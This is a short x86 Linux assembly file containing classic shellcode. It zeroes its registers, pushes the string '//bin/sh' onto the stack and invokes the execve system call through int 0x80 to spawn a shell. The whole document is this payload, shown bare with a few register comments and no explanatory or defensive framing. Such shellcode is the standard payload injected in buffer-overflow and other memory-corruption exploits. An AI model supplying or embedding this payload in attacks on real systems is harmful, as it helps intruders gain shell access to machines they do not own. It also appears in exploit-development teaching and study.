SECTION .text
    global _start

_start:
    xor ecx, ecx
    mul ecx             ; zeros out EAX and EDX
    push eax
    push 0x68732f6e     ;n/sh
    push 0x69622f2f     ;//bi

    mov ebx, esp
    mov al, 0xb
    int 0x80
